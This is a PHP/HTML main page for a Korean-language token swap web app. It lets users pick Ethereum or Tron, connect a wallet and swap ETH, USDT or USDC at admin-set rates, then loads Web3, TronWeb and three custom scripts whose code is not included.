<?php
/*
 * 파일명: index.php
 * 위치: /
 * 기능: 토큰 스왑 시스템 메인 페이지
 * 작성일: 2024-12-27
 */

// ===================================
// 초기 설정
// ===================================

/* 설정 파일 포함 */
require_once(__DIR__ . '/config/config.php');
require_once(__DIR__ . '/includes/functions.php');

// 세션 시작
session_start();

// 관리자 설정 로드
$adminSettings = getAdminSettings();
$mainWalletAddress = $adminSettings['main_wallet'] ?? '';
$swapRates = $adminSettings['swap_rates'] ?? [];

?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>토큰 스왑 시스템</title>
    
    <!-- Bootstrap CSS 비동기 로드 -->
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"></noscript>
    
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    
    <!-- Custom CSS -->
    <link rel="stylesheet" href="assets/css/style.css">
    
    <!-- Critical CSS -->
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f8f9fa;
        }
        .loading-spinner {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
        }
    </style>
</head>
<body>
    <!-- ===================================
     * 로딩 스피너
     * =================================== -->
    <div class="loading-spinner">
        <div class="spinner-border text-primary" role="status">
            <span class="visually-hidden">로딩중...</span>
        </div>
    </div>

    <!-- ===================================
     * 네비게이션
     * =================================== -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-currency-exchange"></i> 토큰 스왑
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="#" id="walletStatus">
                            <i class="bi bi-wallet2"></i> 지갑 미연결
                        </a>
                    </li>
                    <?php if (isset($_SESSION['is_admin']) && $_SESSION['is_admin']): ?>
                    <li class="nav-item">
                        <a class="nav-link" href="admin.php">
                            <i class="bi bi-gear"></i> 관리자
                        </a>
                    </li>
                    <?php endif; ?>
                </ul>
            </div>
        </div>
    </nav>

    <!-- ===================================
     * 메인 컨테이너
     * =================================== -->
    <div class="container mt-5">
        <!-- 메인 지갑 정보 -->
        <?php if ($mainWalletAddress): ?>
        <div class="row mb-4">
            <div class="col-12">
                <div class="alert alert-info">
                    <i class="bi bi-info-circle"></i>
                    <strong>메인 지갑 주소:</strong> 
                    <span class="font-monospace" id="mainWalletAddress"><?php echo htmlspecialchars($mainWalletAddress); ?></span>
                    <button class="btn btn-sm btn-outline-secondary ms-2" onclick="copyAddress('<?php echo htmlspecialchars($mainWalletAddress); ?>')">
                        <i class="bi bi-clipboard"></i>
                    </button>
                </div>
            </div>
        </div>
        <?php else: ?>
        <div class="alert alert-warning">
            <i class="bi bi-exclamation-triangle"></i>
            관리자가 메인 지갑을 설정하지 않았습니다. 관리자에게 문의하세요.
        </div>
        <?php endif; ?>

        <!-- 지갑 연결 섹션 -->
        <div class="row justify-content-center mb-5">
            <div class="col-md-8">
                <div class="card shadow">
                    <div class="card-body p-4">
                        <h4 class="card-title mb-4">
                            <i class="bi bi-link-45deg"></i> 지갑 연결
                        </h4>
                        
                        <!-- 네트워크 선택 -->
                        <div class="mb-4">
                            <label class="form-label fw-bold">네트워크 선택</label>
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <div class="form-check card p-3 network-option" data-network="ethereum">
                                        <input class="form-check-input" type="radio" name="network" id="ethereum" value="ethereum" checked>
                                        <label class="form-check-label w-100" for="ethereum">
                                            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Ethereum" width="24" class="me-2">
                                            <strong>Ethereum</strong>
                                            <small class="d-block text-muted">ERC-20 토큰</small>
                                        </label>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-check card p-3 network-option" data-network="tron">
                                        <input class="form-check-input" type="radio" name="network" id="tron" value="tron">
                                        <label class="form-check-label w-100" for="tron">
                                            <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="Tron" width="24" class="me-2">
                                            <strong>Tron</strong>
                                            <small class="d-block text-muted">TRC-20 토큰</small>
                                        </label>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- 연결 버튼 -->
                        <div class="d-grid">
                            <button class="btn btn-primary btn-lg" id="connectWallet">
                                <i class="bi bi-wallet2"></i> 지갑 연결하기
                            </button>
                        </div>

                        <!-- 연결된 지갑 정보 -->
                        <div id="walletInfo" class="mt-4 d-none">
                            <div class="alert alert-success">
                                <i class="bi bi-check-circle"></i> 지갑이 연결되었습니다
                                <div class="mt-2">
                                    <small>주소: <span id="userWalletAddress" class="font-monospace"></span></small>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- 스왑 섹션 -->
        <div id="swapSection" class="row justify-content-center d-none">
            <div class="col-md-8">
                <div class="card shadow">
                    <div class="card-header bg-primary text-white">
                        <h5 class="mb-0"><i class="bi bi-arrow-left-right"></i> 토큰 스왑</h5>
                    </div>
                    <div class="card-body p-4">
                        <!-- From 섹션 -->
                        <div class="mb-4">
                            <label class="form-label text-muted">보내는 토큰</label>
                            <div class="input-group input-group-lg">
                                <input type="number" class="form-control" id="fromAmount" placeholder="0.0" step="0.000001">
                                <select class="form-select" id="fromToken" style="max-width: 150px;">
                                    <option value="ETH">ETH</option>
                                    <option value="USDT">USDT</option>
                                    <option value="USDC">USDC</option>
                                </select>
                            </div>
                            <small class="text-muted">잔액: <span id="fromBalance">0.0000</span> <span id="fromTokenSymbol">ETH</span></small>
                        </div>

                        <!-- 스왑 방향 표시 -->
                        <div class="text-center mb-4">
                            <button class="btn btn-light btn-sm" id="swapDirection">
                                <i class="bi bi-arrow-down-up"></i>
                            </button>
                        </div>

                        <!-- To 섹션 -->
                        <div class="mb-4">
                            <label class="form-label text-muted">받는 토큰</label>
                            <div class="input-group input-group-lg">
                                <input type="number" class="form-control bg-light" id="toAmount" placeholder="0.0" readonly>
                                <select class="form-select" id="toToken" style="max-width: 150px;">
                                    <option value="USDT">USDT</option>
                                    <option value="USDC">USDC</option>
                                    <option value="ETH">ETH</option>
                                </select>
                            </div>
                            <small class="text-muted">예상 수령량</small>
                        </div>

                        <!-- 교환 비율 -->
                        <div class="alert alert-secondary">
                            <i class="bi bi-info-circle"></i>
                            교환 비율: 1 <span id="rateFrom">ETH</span> = <span id="rateAmount">1800</span> <span id="rateTo">USDT</span>
                        </div>

                        <!-- 스왑 버튼 -->
                        <div class="d-grid">
                            <button class="btn btn-success btn-lg" id="swapButton" disabled>
                                <i class="bi bi-arrow-left-right"></i> 스왑 실행
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- 트랜잭션 내역 -->
        <div class="row mt-5 mb-5">
            <div class="col-12">
                <h4><i class="bi bi-clock-history"></i> 최근 트랜잭션</h4>
                <div id="transactionHistory" class="table-responsive">
                    <!-- AJAX로 로드 -->
                </div>
            </div>
        </div>
    </div>

    <!-- ===================================
     * 스크립트
     * =================================== -->
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- Web3.js (1.x 버전 사용 - 더 안정적) -->
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    
    <!-- TronWeb -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    
    <!-- Web3 로드 확인 후 커스텀 스크립트 로드 -->
    <script>
        // Web3 로드 확인
        function checkWeb3AndLoad() {
            if (typeof Web3 !== 'undefined') {
                console.log('Web3 로드 완료');
                
                // 설정값 전달
                window.CONFIG = {
                    mainWallet: '<?php echo $mainWalletAddress; ?>',
                    swapRates: <?php echo json_encode($swapRates); ?>,
                    network: 'ethereum'
                };
                
                // 커스텀 스크립트 순차적 로드
                function loadScript(src, callback) {
                    const script = document.createElement('script');
                    script.src = src + '?v=' + Date.now();
                    script.onload = callback;
                    document.body.appendChild(script);
                }
                
                // 순서대로 로드: wallet.js -> swap.js -> main.js
                loadScript('assets/js/wallet.js', function() {
                    console.log('wallet.js 로드 완료');
                    loadScript('assets/js/swap.js', function() {
                        console.log('swap.js 로드 완료');
                        loadScript('assets/js/main.js', function() {
                            console.log('main.js 로드 완료');
                            console.log('모든 스크립트 로드 완료!');
                        });
                    });
                });
                
            } else {
                console.error('Web3가 로드되지 않았습니다. 재시도합니다...');
                setTimeout(checkWeb3AndLoad, 500);
            }
        }
        
        // 페이지 로드 완료 후 실행
        window.addEventListener('load', checkWeb3AndLoad);
    </script>
</body>
</html>